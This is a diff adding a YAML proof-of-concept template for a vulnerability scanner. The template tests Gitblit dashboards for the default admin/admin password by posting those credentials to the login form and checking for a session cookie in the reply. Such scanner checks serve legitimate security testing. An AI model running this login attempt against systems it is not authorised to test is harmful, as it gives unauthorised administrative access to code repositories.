@@ -1,0 +1,19 @@
+id: poc-yaml-gitblit-weak-pass
+info:
+  name: Gitblit Dashboard 弱密码漏洞
+  severity: high
+  tags:
+  - 弱口令
+  finger: Gitblit
+  osprey-id: vb_2022_0008
+requests:
+- method: POST
+  path: '/?wicket:interface=:0:userPanel:loginForm::IFormSubmitListener::'
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: wicket:bookmarkablePage=:com.gitblit.wicket.pages.MyDashboardPage&id1_hf_0=&username=admin&password=admin
+  expression: 'status_code == 302 && contains(headers, "Set-Cookie: Gitblit=")
+
+    '
+variables: {}
+transport: http
